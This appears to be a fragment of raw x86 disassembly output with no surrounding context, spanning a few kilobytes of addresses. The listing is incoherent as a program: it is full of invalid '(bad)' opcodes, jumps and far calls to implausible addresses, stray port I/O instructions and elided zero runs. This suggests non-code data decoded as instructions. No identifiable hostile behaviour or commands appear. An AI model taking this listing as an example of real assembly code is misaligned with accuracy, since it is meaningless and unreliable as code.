  4058dd:	and    al,0xeb
  4058df:	cmp    bl,BYTE PTR [ebx]
  4058e1:	cmp    BYTE PTR [eax-0x17],ah
  4058e4:	pop    ecx
  4058e5:	arpl   WORD PTR [edi-0x15],bx
  4058e8:	pop    ecx
  4058e9:	arpl   WORD PTR [edi-0x16],bx
  4058ec:	pop    ebx
  4058ed:	arpl   WORD PTR ds:0xc3e9,ax
	...
  4058ff:	add    ah,bh
  405901:	jo     0x4058e8
  405903:	fistp  DWORD PTR [ebp-0x25fc1630]
  405909:	inc    eax
  40590a:	gs inc esp
  40590c:	outs   dx,DWORD PTR ds:[esi]
  40590d:	push   esi
  40590e:	pop    esi
  40590f:	jns    0x40597c
  405911:	fstp   QWORD PTR [edx]
  405913:	out    dx,al
  405914:	aam    0xea
  405916:	es dec ecx
  405918:	retf   
  405919:	add    eax,0x7e6303e9
  40591e:	xchg   esp,eax
  40591f:	sti    
  405920:	jmp    0xbb89bd3c
  405925:	push   ebp
  405926:	rol    DWORD PTR [ebx-0x7f16fa9d],0xde
  40592d:	ins    DWORD PTR es:[edi],dx
  40592e:	push   ds
  40592f:	out    dx,eax
  405930:	pushf  
  405931:	push   ebp
  405932:	push   ss
  405933:	jns    0x4059a0
  405935:	jmp    0x401:0x68e1ffbb
  40593c:	push   cs
  40593d:	push   es
  40593e:	stos   BYTE PTR es:[edi],al
  40593f:	ficomp DWORD PTR [ebx-0x16]
  405942:	add    BYTE PTR [eax+ecx*4+0x78],bh
  405946:	test   DWORD PTR [ecx+0x7d],esi
  405949:	jmp    0xd1fc:0x707439ff
  405950:	mov    bh,0xea
  405952:	call   esi
  405954:	pop    ecx
  405955:	stos   BYTE PTR es:[edi],al
  405956:	je     0x405943
  405958:	sub    DWORD PTR [eax-0x22acc301],ebp
  40595e:	stc    
  40595f:	xchg   ebp,eax
  405960:	pusha  
  405961:	add    eax,0xaa8b
	...
  405972:	add    BYTE PTR [ecx+0x60e1c2bc],ch
  405978:	push   eax
  405979:	mov    edx,DWORD PTR [ebp-0x61073f1f]
  40597f:	fwait
  405980:	stc    
  405981:	out    0x5b,eax
  405983:	or     edx,ebp
  405985:	jmp    DWORD PTR [eax-0x65]
  405988:	in     eax,dx
  405989:	(bad)  
  40598a:	sub    al,0x13
  40598c:	add    eax,0xea60e900
  405991:	jne    0x405978
  405993:	sbb    ah,al
  405995:	std    
  405996:	outs   dx,BYTE PTR ds:[esi]
  405997:	std    
  405998:	jge    0x4059ef
  40599a:	cmc    
  40599b:	imul   edx,DWORD PTR [edi],0x53ae96a
  4059a1:	(bad)  
  4059a2:	fadd   st(4),st
  4059a4:	jmp    0x6ffdab1e
  4059a9:	or     BYTE PTR [esi+0x4b],al
  4059ac:	stc    
  4059ad:	(bad)  
  4059ae:	fwait
  4059af:	ins    BYTE PTR es:[edi],dx
  4059b0:	mov    esp,0x5060e1c2
  4059b5:	mov    edi,DWORD PTR ds:0x2ef8c0e1
  4059bb:	sbb    ebp,ebp
  4059bd:	add    cl,ch
  4059bf:	pusha  
  4059c0:	add    eax,0x484acc7
  4059c5:	add    cl,ch
  4059c7:	pusha  
  4059c8:	jle    0x405a1f
  4059ca:	add    BYTE PTR [edx-0x3872ed92],dl
  4059d0:	fst    QWORD PTR [eax+0x6a]
  4059d3:	mov    ebx,edx
  4059d5:	jne    0x4059d3
	...
  4059e3:	add    BYTE PTR [eax],al
  4059e5:	add    BYTE PTR [ebp+0x71],bh
  4059e8:	clc    
  4059e9:	inc    DWORD PTR [edi]
  4059eb:	jmp    0x6e96acee
  4059f0:	inc    ebp
  4059f1:	clc    
  4059f2:	add    eax,esp
  4059f4:	add    al,0x0
  4059f6:	xchg   edi,eax
  4059f7:	outs   dx,BYTE PTR ds:[esi]
  4059f8:	in     al,dx
  4059f9:	push   0x3b
  4059fb:	push   0xda5a0c45
  405a00:	jne    0x405a0a
  405a02:	and    bl,BYTE PTR [ebx]
  405a04:	cld    
  405a05:	(bad)  
  405a06:	std    
  405a07:	lods   al,BYTE PTR ds:[esi]
  405a08:	ret    0x3a08
  405a0b:	push   eax
  405a0c:	mov    ebp,esp
  405a0e:	jo     0x405a0d
  405a10:	mov    WORD PTR [ebp-0x2],es
  405a13:	push   esp
  405a14:	push   DWORD PTR [ebp+0x2]
  405a17:	int    0x2a
  405a19:	cld    
  405a1a:	fstp   st(2)
  405a1c:	leave  
  405a1d:	ret    0x4f2
  405a20:	push   ebp
  405a21:	mov    ebx,esi
  405a23:	xchg   BYTE PTR [ebp+0xc],bh
  405a26:	cli    
  405a27:	jo     0x405a3d
  405a29:	cmp    edi,0x14
  405a2c:	add    BYTE PTR [esp+ecx*8-0x27],dh
  405a30:	jne    0x405a42
  405a32:	sub    eax,0xb7ff0c70
  405a37:	in     al,dx
  405a38:	out    0x9,eax
  405a3a:	push   ds
  405a3b:	(bad)  
  405a3d:	leave  
  405a3e:	mov    BYTE PTR ds:0xe5415500,al
  405a44:	push   DWORD PTR [ebp-0x76]
  405a47:	fnstenv [ebp+0x8]
	...
  405a56:	add    BYTE PTR [eax],al
  405a58:	add    BYTE PTR [edx-0x4b],dl
  405a5b:	(bad)  
  405a5c:	(bad)  
  405a5d:	jge    0x4059e5
  405a5f:	jge    0x405a71
  405a61:	arpl   si,bx
  405a63:	ja     0x405a79
  405a65:	loopne 0x405ae0
  405a67:	(bad)  
  405a68:	call   DWORD PTR [eax]
  405a6a:	lock in al,dx
  405a6c:	jne    0x405ac1
  405a6e:	out    0x76,eax
  405a70:	or     al,0x74
  405a72:	imul   edi,ebx,0xecd7b4e7
  405a78:	call   FWORD PTR [edx-0x48000064]
  405a7e:	jae    0x405a5f
  405a80:	adc    esi,0xffffffe2
  405a83:	add    esi,DWORD PTR [ecx+ebx*2-0x49]
  405a87:	jbe    0x405a95
  405a89:	cmp    esi,esi
  405a8b:	xlat   BYTE PTR ds:[ebx]
  405a8c:	add    BYTE PTR [ebx-0x2d],ah
  405a8f:	add    DWORD PTR [ebx],ebp
  405a91:	and    ecx,DWORD PTR [esi]
  405a93:	in     eax,dx
  405a94:	jne    0x405af5
  405a96:	xchg   edi,eax
  405a97:	jbe    0x405aa1
  405a99:	cmp    ecx,DWORD PTR [ebx-0x14]
  405a9c:	call   FWORD PTR [esi*4+0x296308c1]
  405aa3:	jns    0x405a91
  405aa5:	loopne 0x405a9f
  405aa7:	adc    edi,edi
  405aa9:	mov    ?,ecx
  405aab:	in     al,dx
  405aac:	jne    0x405b1d
  405aae:	addr16 jbe 0x405ab9
  405ab1:	or     edx,DWORD PTR [edi-0x7d130014]
  405ab7:	std    
  405ab8:	(bad)  
  405ab9:	outs   dx,BYTE PTR ds:[esi]
  405aba:	out    dx,al
  405abb:	in     al,dx
  405abc:	jne    0x405abe
	...
  405aca:	add    BYTE PTR [eax],al
  405acc:	outs   dx,DWORD PTR ds:[esi]
  405acd:	inc    edi
  405ace:	jbe    0x405ad8
  405ad0:	retf   
  405ad1:	(bad)  
  405ad2:	in     al,dx
  405ad3:	dec    esp
  405ad5:	and    al,0xc1
  405ad7:	or     al,0x63
  405ad9:	mov    DWORD PTR [eax-0x14],edi
  405adc:	mov    esp,0xb4e7fbb0
  405ae1:	das    
  405ae2:	in     al,dx
  405ae3:	call   DWORD PTR [ebx]
  405ae5:	(bad)  
  405ae6:	sti    
  405ae7:	imul   eax,DWORD PTR [di],0xffffffd1
  405aeb:	inc    edx
  405aec:	arpl   ax,bp
  405aee:	xchg   esp,eax
  405aef:	sti    
  405af0:	jl     0x405b2d
  405af2:	push   ss
  405af3:	in     al,dx
  405af4:	mov    WORD PTR [edx-0x17],ds
  405af7:	in     al,dx
  405af8:	push   cs
  405af9:	std    
  405afa:	adc    BYTE PTR [edi],bl
  405afc:	jl     0x405ae5
  405afe:	(bad)  
  405aff:	pop    eax
  405b00:	popa   
  405b01:	jp     0x405aaf
  405b03:	call   FWORD PTR [eax+ebp*8]
  405b06:	je     0x405b03
  405b08:	jl     0x405b3d
  405b0a:	out    0xeb,al
  405b0c:	pop    esp
  405b0d:	pop    esp
  405b0e:	jmp    0x405b88
  405b10:	sahf   
  405b11:	adc    eax,0xfdd6eb39
  405b16:	shl    BYTE PTR [ecx],0x44
  405b19:	out    0xc6,eax
  405b1b:	dec    esp
  405b1c:	sub    al,ah
  405b1e:	in     eax,dx
  405b1f:	add    ecx,DWORD PTR [esi+0x2787c57a]
  405b25:	jmp    0xede3:0xdd5b71ae
  405b2c:	sbb    al,0xe7
  405b2e:	rol    BYTE PTR [eax+0x0],cl
	...
  405b3d:	add    BYTE PTR [eax],al
  405b3f:	addr16 jl 0x405b6e
  405b42:	call   0xfc1d9c27
  405b47:	jp     0x405b4e
  405b49:	xchg   BYTE PTR [ecx+0x6f],dh
  405b4c:	out    0xf4,al
  405b4e:	sti    
  405b4f:	cld    
  405b50:	fnstenv [eax-0x15]
  405b53:	in     al,dx
  405b54:	out    0xf4,al
  405b56:	out    0xe4,eax
  405b58:	jo     0x405b4b
  405b5a:	fstp   TBYTE PTR [eax-0x2b14a119]
  405b60:	jo     0x405b43
  405b62:	(bad)  [edi-0x17]
  405b65:	dec    esi
  405b66:	jmp    0x405b40
  405b68:	inc    eax
  405b69:	inc    ebp
  405b6a:	mov    ebp,0x50e8fda1
  405b6f:	call   0xa3aa5c4d
  405b74:	icebp  
  405b75:	(bad)  
  405b76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b77:	mov    ah,0x5
  405b79:	add    cl,ch
  405b7b:	pusha  
  405b7c:	js     0x405bc3
  405b7e:	sbb    eax,0xe175e62f
  405b83:	test   al,0x51
  405b85:	aam    0xe9
  405b87:	pusha  
  405b88:	add    al,0x81
  405b8b:	pop    ebx
  405b8c:	out    0x75,al
  405b8e:	icebp  
  405b8f:	cwde   
  405b90:	loope  0x405b8b
  405b92:	idiv   BYTE PTR [ecx+0x7c]
  405b95:	inc    ebp
  405b96:	icebp  
  405b97:	jns    0x405c09
  405b99:	cld    
  405b9a:	shr    DWORD PTR [ebx-0x2e],1
  405b9d:	add    cl,ch
  405b9f:	push   ebp
  405ba0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405ba1:	je     0x405ba2
	...
  405baf:	add    BYTE PTR [eax],al
  405bb1:	add    BYTE PTR [ecx],bh
  405bb3:	jo     0x405bad
  405bb5:	cmp    DWORD PTR [ebp+0x6238e805],esp
  405bbb:	add    eax,0xf1a37000
  405bc0:	(bad)  
  405bc1:	cmp    al,0x3b
  405bc3:	fisttp QWORD PTR [ecx]
  405bc5:	call   0xde1f:0x1cff0560
  405bcc:	mov    ebx,0x8be609a2
  405bd1:	sub    al,0x13
  405bd3:	test   bh,0x96
  405bd6:	xor    BYTE PTR [ebp-0x1],dl
  405bd9:	cld    
  405bda:	clc    
  405bdb:	(bad)  [edx+0x7f]
  405bde:	or     esi,esp
  405be0:	leave  
  405be1:	stos   DWORD PTR es:[edi],eax
  405be2:	in     al,dx
  405be3:	in     eax,0x54
  405be5:	bound  ecx,QWORD PTR [edx+eax*4]
  405be8:	les    ebx,FWORD PTR [ecx-0x5f]
  405beb:	aas    
  405bec:	hlt    
  405bed:	jmp    0x64406152
  405bf2:	and    ebp,ecx
  405bf4:	push   eax
  405bf5:	dec    esi
  405bf6:	push   ebx
  405bf7:	std    
  405bf8:	out    0x0,eax
  405bfa:	adc    al,0xcf
  405bfc:	add    BYTE PTR [eax],al
  405bfe:	aas    
  405bff:	ret    0x4d78
  405c02:	jne    0x405c79
  405c04:	or     al,ch
  405c06:	hlt    
  405c07:	fdivr  st,st(7)
  405c09:	call   DWORD PTR [ebx]
  405c0b:	inc    ebp
  405c0c:	clc    
  405c0d:	xor    edi,0xffffffd9
  405c10:	add    al,0x72
  405c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405c13:	jle    0x405c82
  405c15:	clc    
	...
  405c22:	add    BYTE PTR [eax],al
  405c24:	add    BYTE PTR [esi-0x26],bh
  405c27:	jne    0x405c25
  405c29:	push   edx
  405c2a:	(bad)  
  405c2b:	rol    BYTE PTR [eax],cl
  405c2d:	mov    ah,dh
  405c2f:	mov    edi,0x75daa874
  405c34:	clc    
  405c35:	retf   0x47
  405c38:	call   0x404088
  405c3d:	inc    ebp
  405c3e:	mov    eax,ds:0x24c3d0f7
  405c43:	hlt    
  405c44:	jmp    FWORD PTR [edi-0x276a1713]
  405c4a:	or     DWORD PTR [eax],eax
  405c4c:	jmp    0x405c5a
  405c4e:	out    dx,al
  405c4f:	jne    0x405c59
  405c51:	and    ah,BYTE PTR ds:0x2f5fffb
  405c57:	ror    cl,0xc8
  405c5a:	add    eax,0x1fceb00
  405c5f:	ror    cl,0xb8
  405c62:	add    eax,0x42f86a00
  405c67:	cld    
  405c68:	(bad)  
  405c69:	jmp    eax
  405c6b:	out    0xf0,eax
  405c6d:	loop   0x405c5d
  405c6f:	inc    edi
  405c71:	aas    
  405c72:	fld    DWORD PTR [ecx]
  405c74:	add    dl,bh
  405c76:	or     BYTE PTR [ebp-0xc6c5bb],cl
  405c7c:	jne    0x405c50
  405c7e:	rcl    dl,0xfb
  405c81:	arpl   WORD PTR [ebx],di
  405c83:	jmp    0x47ea30b
  405c88:	je     0x405c8a
	...
  405c96:	add    BYTE PTR [eax],al
  405c98:	push   ecx
  405c99:	fstp   TBYTE PTR [ebx+0x6f1a1e3b]
  405c9f:	pop    es
  405ca0:	jmp    0x405c8f
  405ca2:	add    eax,DWORD PTR [eax]
  405ca4:	arpl   WORD PTR [edi+0x2],ax
  405ca7:	sub    esp,DWORD PTR [ebx-0x5cd4fa09]
  405cad:	adc    eax,0xa16304c6
  405cb2:	jl     0x405ca0
  405cb4:	loopne 0x405ce0
  405cb6:	in     al,dx
  405cb7:	lea    esp,[esi]
  405cb9:	or     dl,BYTE PTR [edi+edi*8-0x12]
  405cbd:	aad    0xdb
  405cbf:	dec    eax
  405cc0:	nop
  405cc1:	out    dx,al
  405cc2:	add    eax,DWORD PTR [ebp-0xe3a95d]
  405cc8:	(bad)  
  405cc9:	(bad)  
  405cca:	fcmovnu st,st(0)
  405ccc:	pop    ebx
  405ccd:	ret    
  405cce:	call   0xe8f7035c
  405cd3:	jne    0x405d1c
  405cd5:	(bad)  
  405cd6:	adc    dl,dl
  405cd8:	arpl   si,bp
  405cda:	cld    
  405cdb:	mov    edi,0x75e8baaf
  405ce0:	pop    edi
  405ce1:	fwait
  405ce2:	outs   dx,BYTE PTR ds:[esi]
  405ce3:	clc    
  405ce4:	xchg   ebx,eax
  405ce5:	(bad)  
  405ce6:	pop    ss
  405ce7:	or     esp,DWORD PTR [ebx-0x12]
  405cea:	call   0xe8b67464
  405cef:	shl    DWORD PTR [ebx-0x12],1
  405cf2:	call   0xb2c6b86c
  405cf7:	cli    
  405cf8:	cld    
  405cf9:	mov    bh,BYTE PTR [edx+0xc2]
	...
  405d0b:	imul   ebp,esi,0x4e
  405d0e:	mov    edi,edi
  405d10:	outs   dx,BYTE PTR ds:[esi]
  405d11:	mov    edi,0xccc790e8
  405d16:	lea    esp,[esi]
  405d18:	add    eax,0x59d45365
  405d1d:	icebp  
  405d1e:	fcmovne st,st(3)
  405d20:	mov    dh,0xe9
  405d22:	add    ebx,esi
  405d24:	(bad)  
  405d25:	fidivr WORD PTR [ebx-0xc]
  405d28:	add    al,0xe9
  405d2a:	add    esi,DWORD PTR [ecx+ebx*2-0x2318240f]
  405d31:	ss call 0xe875a711
  405d37:	push   ss
  405d38:	loope  0x405d4b
  405d3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d3b:	mov    dl,0x4
  405d3d:	jmp    0x6d542a3e
  405d42:	xchg   DWORD PTR [ebx+0x5],esp
  405d45:	jmp    0x71583c4
  405d4a:	outs   dx,BYTE PTR ds:[esi]
  405d4b:	outs   dx,DWORD PTR ds:[esi]
  405d4c:	in     al,dx
  405d4d:	sub    ebx,edx
  405d4f:	arpl   WORD PTR ds:0xa5fbf6a,ax
  405d55:	jmp    0x3946105d
  405d5a:	fmul   QWORD PTR [edx]
  405d5c:	push   es
  405d5d:	jmp    0xc5893765
  405d62:	out    0xce,eax
  405d64:	fld    st(1)
  405d66:	xchg   edi,eax
  405d67:	dec    edx
  405d68:	push   es
  405d69:	jmp    0xe44a7cf0
  405d6e:	add    eax,DWORD PTR [eax]
	...
  405d7c:	add    BYTE PTR [eax],al
  405d7e:	arpl   bp,si
  405d80:	call   0xe9b698d8
  405d85:	add    esp,DWORD PTR [ebx-0x74]
  405d88:	sub    al,0xdc
  405d8a:	mov    DWORD PTR ds:0xe2ff719e,eax
  405d90:	sbb    al,0xf0
  405d92:	add    al,0x59
  405d94:	and    edi,0x8d91d576
  405d9a:	or     al,BYTE PTR [esi]
  405d9c:	jmp    0x3a8523
  405da1:	pop    edi
  405da2:	mov    ds:0xc4f4ffdd,al
  405da7:	in     eax,dx
  405da8:	cmp    BYTE PTR gs:[edi+0x5],bl
  405dac:	call   esp
  405dae:	enter  0x90ea,0x53
  405db2:	mov    esp,0x18e16ae2
  405db7:	jmp    DWORD PTR [edi]
  405db9:	test   al,0x60
  405dbb:	loop   0x405e32
  405dbd:	icebp  
  405dbe:	mov    cl,al
  405dc0:	cld    
  405dc1:	ss mov esp,0x122ed80e
  405dc7:	fcos   
  405dc9:	pushf  
  405dca:	cwde   
  405dcb:	jmp    0x3123:0xe2841dba
  405dd2:	jl     0x405e2c
  405dd4:	clc    
  405dd5:	push   cs
  405dd6:	repnz in al,dx
  405dd8:	(bad)  
  405dd9:	jl     0x405e53
  405ddb:	jmp    0x1123:0xe285fde0
	...
  405dee:	add    BYTE PTR [eax],al
  405df0:	add    BYTE PTR [eax+ebx*2-0x14],bh
  405df4:	add    DWORD PTR [ebp+eax*1+0x0],ebp
  405df8:	jmp    0xd228b63a
  405dfd:	push   ebp
  405dfe:	loop   0x405dff
  405e00:	jmp    0xc148b642
  405e05:	pop    ss
  405e06:	fdiv   st(7),st
  405e08:	(bad)  
  405e09:	mov    ecx,0x22b05bc6
  405e0e:	or     DWORD PTR [eax],eax
  405e10:	sbb    al,0xa8
  405e12:	icebp  
  405e13:	sub    DWORD PTR [edi+ebx*1],0xffffffe2
  405e17:	jae    0x405e0a
  405e19:	std    
  405e1a:	push   edi
  405e1b:	or     BYTE PTR [ecx-0x16ff4b9d],dl
  405e21:	imul   eax,ebp,0xe1fcabc9
  405e27:	push   esp
  405e28:	add    BYTE PTR [ecx-0x46],dh
  405e2b:	mov    eax,DWORD PTR [ebp-0xe]
  405e2e:	add    al,0x80
  405e30:	add    dl,bh
  405e32:	add    eax,0xc18a6a50
  405e37:	repnz ror dl,1
  405e3a:	add    eax,0x5c6c2c9
  405e3f:	push   ebp
  405e40:	mov    ebx,DWORD PTR [esi]
  405e42:	push   ebx
  405e43:	cld    
  405e44:	mov    ebp,DWORD PTR [edi-0x51b27523]
  405e4a:	out    0xe,al
  405e4c:	push   ecx
  405e4d:	jnp    0x405e10
  405e4f:	add    ch,BYTE PTR [ebx]
  405e51:	jp     0x405e2a
  405e53:	stos   DWORD PTR es:[edi],eax
  405e54:	pop    ecx
	...
  405e61:	add    BYTE PTR [eax],al
  405e63:	add    BYTE PTR [ecx],cl
  405e65:	jmp    0x4b71516d
  405e6a:	leave  
  405e6b:	ret    0x592
  405e6e:	push   ebp
  405e6f:	mov    ebx,DWORD PTR [esi+0x50]
  405e72:	push   edi
  405e73:	mov    ebp,edi
  405e75:	fsincos 
  405e77:	mov    esi,edi
  405e79:	fisttp QWORD PTR [edx+0x2e68a4d]
  405e7f:	repz push ss
  405e81:	dec    ebx
  405e82:	pop    esi
  405e83:	leave  
  405e84:	mov    al,bl
  405e86:	call   DWORD PTR [ecx+edx*8-0x43]
  405e8a:	push   esi
  405e8b:	push   edi
  405e8c:	shl    DWORD PTR [eax+0x8],1
  405e8f:	cld    
  405e90:	rcr    DWORD PTR [eax],0x10
  405e93:	sub    ecx,DWORD PTR [edx]
  405e95:	pop    edi
  405e96:	jge    0x405ea4
  405e98:	sub    DWORD PTR [ebx+esi*8],eax
  405e9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405e9c:	xor    DWORD PTR [ebp+esi*2+0x5e4a7a01],ebx
  405ea3:	leave  
  405ea4:	enter  0xffdd,0x54
  405ea8:	xchg   ecx,eax
  405ea9:	mov    ebp,0x4feec483
  405eae:	push   edi
  405eaf:	push   ebx
  405eb0:	arpl   WORD PTR [esi],ax
  405eb2:	add    al,BYTE PTR [ecx]
  405eb4:	arpl   si,bp
  405eb6:	in     al,0x75
  405eb8:	imul   esi,DWORD PTR [esi-0x6d],0xffffffff
  405ebc:	in     al,dx
  405ebd:	pop    edi
  405ebe:	jns    0x405f3d
  405ec0:	pop    ebx
  405ec1:	das    
  405ec2:	cmp    eax,0x415b12b
  405ec7:	add    DWORD PTR [eax],eax
	...
  405ed5:	add    BYTE PTR [eax],al
  405ed7:	arpl   si,bp
  405ed9:	jnp    0x405eef
  405edb:	mov    DWORD PTR [eax-0x3e],eax
  405ede:	loop   0x405eaa
  405ee0:	arpl   WORD PTR [edi+0x8],sp
  405ee3:	and    al,0xa7
  405ee5:	js     0x405f5c
  405ee7:	xor    BYTE PTR [bx],bh
  405eea:	(bad)  
  405eeb:	arpl   bx,si
  405eed:	mov    edx,0x64882b
  405ef2:	cmp    ebp,ebx
  405ef4:	test   eax,0x281e00e4
  405ef9:	jp     0x405eff
  405efb:	push   edx
  405efc:	out    dx,al
  405efd:	ds (bad) 
  405eff:	push   esp
  405f00:	inc    eax
  405f01:	dec    edi
  405f02:	(bad)  
  405f03:	jmp    0x5fc888f2
  405f08:	ret    
  405f09:	jns    0x405f50
  405f0b:	ins    BYTE PTR es:[edi],dx
  405f0c:	push   esi
  405f0d:	add    BYTE PTR [edx],bh
  405f0f:	and    dl,BYTE PTR [ebx-0x132eefca]
  405f15:	sbb    cl,cl
  405f17:	push   ebp
  405f18:	stos   DWORD PTR es:[edi],eax
  405f19:	outs   dx,BYTE PTR ds:[esi]
  405f1a:	aad    0xa8
  405f1c:	pop    ds
  405f1d:	inc    esi
  405f1e:	leave  
  405f1f:	and    edx,ebp
  405f21:	add    edx,DWORD PTR [ebp-0x18]
  405f24:	mov    eax,ds:0xfb3bc480
  405f29:	dec    ebp
  405f2a:	push   edi
  405f2b:	sub    al,0x19
  405f2d:	cld    
  405f2e:	pop    edx
  405f2f:	fldl2e 
  405f31:	jnp    0x405f78
  405f33:	push   ds
  405f34:	fs inc eax
  405f36:	add    ebx,ebp
  405f38:	add    al,0x2c
  405f3a:	call   0x405f3f
	...
  405f47:	add    BYTE PTR [eax],al
  405f49:	add    al,bl
  405f4b:	(bad)  [esi]
  405f4d:	cmp    eax,0xbce559d8
  405f52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405f53:	fucomp st(1)
  405f55:	add    esp,DWORD PTR [ebx+0x5]
  405f58:	jb     0x405f90
  405f5a:	push   ebx
  405f5b:	in     al,0x29
  405f5d:	out    0x9e,al
  405f5f:	loop   0x405f47
  405f61:	lods   eax,DWORD PTR ds:[esi]
  405f62:	es loop 0x405f43
  405f65:	lods   eax,DWORD PTR ds:[esi]
  405f66:	outs   dx,DWORD PTR ds:[esi]
  405f67:	sbb    eax,0x4cc4e71
  405f6c:	mov    ah,0xe7
  405f6e:	push   esp
  405f6f:	xchg   edi,eax
  405f70:	lods   al,BYTE PTR ds:[esi]
  405f71:	out    0xe9,eax
  405f73:	clc    
  405f74:	adc    BYTE PTR [esi+ecx*1-0x21],bh
  405f78:	imul   BYTE PTR [ebp+0xf71e226]
  405f7e:	imul   edx,DWORD PTR [eax],0x7f
  405f81:	ds lahf 
  405f83:	mov    dl,BYTE PTR [esp+eiz*8+0x79e0f8eb]
  405f8a:	ss loopne 0x405f78
  405f8d:	dec    esi
  405f8e:	test   DWORD PTR [edx+0x49e829fd],ecx
  405f94:	adc    DWORD PTR [ebx],esi
  405f96:	dec    edi
  405f97:	adc    eax,0xe26b3e06
  405f9c:	sub    DWORD PTR [ecx+0x1e],edi
  405f9f:	loop   0x406002
  405fa1:	add    cl,ch
  405fa3:	dec    eax
  405fa4:	in     eax,dx
  405fa5:	jp     0x405f47
  405fa7:	add    al,0x46
  405fa9:	inc    edx
  405faa:	test   al,0xcc
  405fac:	stos   DWORD PTR es:[edi],eax
  405fad:	adc    BYTE PTR [eax],al
	...
  405fbb:	add    BYTE PTR [eax],al
  405fbd:	arpl   WORD PTR [eax],di
  405fbf:	(bad)  
  405fc0:	lock loop 0x405f8c
  405fc3:	mov    ebp,0x1adf34e2
  405fc8:	das    
  405fc9:	or     BYTE PTR [ecx-0x216c1fdc],dl
  405fcf:	add    BYTE PTR [edi+ebp*2],bh
  405fd2:	in     eax,dx
  405fd3:	mov    ds:0x85055f99,eax
  405fd8:	test   eax,0xe9968d70
  405fdd:	pusha  
  405fde:	add    eax,0xed6f1cff
  405fe3:	das    
  405fe4:	xchg   edi,eax
  405fe5:	add    bh,bl
  405fe7:	mov    DWORD PTR [ebx+ecx*1],ebp
  405fea:	fbstp  TBYTE PTR [ebp+0x7d]
  405fed:	imul   DWORD PTR [ebp-0x31]
  405ff0:	jmp    0xf6006a55
  405ff5:	inc    ecx
  405ff6:	mov    WORD PTR [ebp+0x59],es
  405ff9:	rcr    BYTE PTR [eax-0xc],0x51
  405ffd:	cmp    edi,ebx
  405fff:	call   DWORD PTR [esi-0x12]
  406002:	dec    eax
  406003:	clc    
  406004:	dec    esi
  406005:	sbb    bl,cl
  406007:	(bad)  
  406008:	mov    esp,0x3975de88
  40600d:	mov    bh,0x91
  40600f:	(bad)  
  406010:	ss sbb dh,0x75
  406014:	sub    eax,0xe9cf4787
  406019:	pusha  
  40601a:	fidiv  WORD PTR [ebp-0x13]
  40601d:	js     0x406032
  40601f:	iret   
  406020:	jmp    0x406025
	...
  40602d:	add    BYTE PTR [eax],al
  40602f:	add    BYTE PTR [eax+0x35],ah
  406032:	call   DWORD PTR [esp+eiz*2-0x7ee87a70]
  406039:	fdivp  st(7),st
  40603b:	cdq    
  40603c:	js     0x405fe6
  40603e:	(bad)  
  40603f:	test   BYTE PTR [ecx-0x22],0x75
  406043:	cmc    
  406044:	inc    ecx
  406045:	pop    eax
  406046:	clc    
  406047:	je     0x406024
  406049:	out    dx,al
  40604a:	(bad)  
  40604b:	fiadd  WORD PTR [ecx+0x35]
  40604e:	call   0x1ea32a
  406053:	into   
  406054:	fwait
  406055:	or     eax,0xc17d00e8
  40605a:	(bad)  
  40605b:	call   DWORD PTR [eax+0x62256811]
  406061:	dec    eax
  406062:	add    bh,bh
  406064:	dec    edi
  406065:	adc    eax,ebp
  406067:	xchg   ebx,eax
  406068:	shl    dl,0xff
  40606b:	or     esp,DWORD PTR [edx]
  40606d:	jecxz  0x4060e4
  40606f:	hlt    
  406070:	aad    0x3c
  406072:	clc    
  406073:	dec    DWORD PTR [edi+0x11]
  406076:	call   0x2340fe
  40607b:	and    eax,edx
  40607d:	loop   0x4060f4
  40607f:	clc    
  406080:	loop   0x406020
  406082:	std    
  406083:	inc    DWORD PTR [ebp-0x1d]
  406086:	jne    0x406090
  406088:	xor    al,BYTE PTR [ebp-0x70da0009]
  40608e:	ret    
  40608f:	pop    ebx
  406090:	or     eax,0x8
	...
  4060a3:	out    dx,eax
  4060a4:	mov    gs,esp
  4060a6:	cmp    DWORD PTR [esi-0x4a],0x57
  4060aa:	mov    edi,edi
  4060ac:	aad    0xa
  4060ae:	rcr    dh,0xb
  4060b1:	mov    DWORD PTR [eax],0x18a
  4060b7:	mov    cl,0xe2
  4060b9:	cmp    DWORD PTR [ebp+0x62],0x8
  4060bd:	jne    0x4060c6
  4060bf:	adc    BYTE PTR [edx],al
  4060c1:	add    al,BYTE PTR [eax]
  4060c3:	mov    ch,dh
  4060c5:	jae    0x75423ab2
  4060cb:	jge    0x40614c
  4060cd:	add    BYTE PTR [ecx],al
  4060cf:	dec    edx
  4060d0:	or     ebx,ebp
  4060d2:	add    ah,BYTE PTR [ecx]
  4060d4:	xchg   ebx,eax
  4060d5:	or     edx,0x20163
  4060db:	mov    bh,0x44
  4060dd:	cld    
  4060de:	push   eax
  4060df:	arpl   WORD PTR [eax],sp
  4060e1:	outs   dx,BYTE PTR ds:[esi]
  4060e2:	add    BYTE PTR [edx+esi*1],dh
  4060e5:	adc    bh,bh
  4060e7:	mov    dh,0xd6
  4060e9:	jmp    0x4060bb
  4060eb:	adc    al,0xef
  4060ed:	add    ecx,DWORD PTR [ebx]
  4060ef:	and    ebx,DWORD PTR [edx]
  4060f1:	jno    0x406080
  4060f3:	sahf   
  4060f4:	xchg   esi,eax
  4060f5:	xor    al,0x6a
  4060f7:	arpl   WORD PTR [ecx+0x47],dx
  4060fa:	hlt    
  4060fb:	mov    bl,0xf8
  4060fd:	add    edi,edi
  4060ff:	jbe    0x4060df
  406101:	loopne 0x406178
  406103:	test   DWORD PTR [esi+0xcf9d],0x0
	...
  406115:	add    BYTE PTR [ebx-0x12],ah
  406118:	or     al,0xc0
  40611a:	outs   dx,BYTE PTR ds:[esi]
  40611b:	sub    al,BYTE PTR [ebp+0x57eedb7d]
  406121:	inc    esi
  406122:	loopne 0x40610d
  406124:	xlat   BYTE PTR ds:[ebx]
  406125:	add    DWORD PTR [esi-0x14],edx
  406128:	test   BYTE PTR [ebp-0x35],bh
  40612b:	in     eax,dx
  40612c:	push   edi
  40612d:	cmp    ch,al
  40612f:	test   eax,0x461340db
  406134:	inc    edx
  406135:	std    
  406136:	lods   al,BYTE PTR ds:[esi]
  406137:	inc    ebx
  406138:	(bad)  
  406139:	clc    
  40613a:	(bad)  
  40613b:	mov    eax,ds:0xc83450db
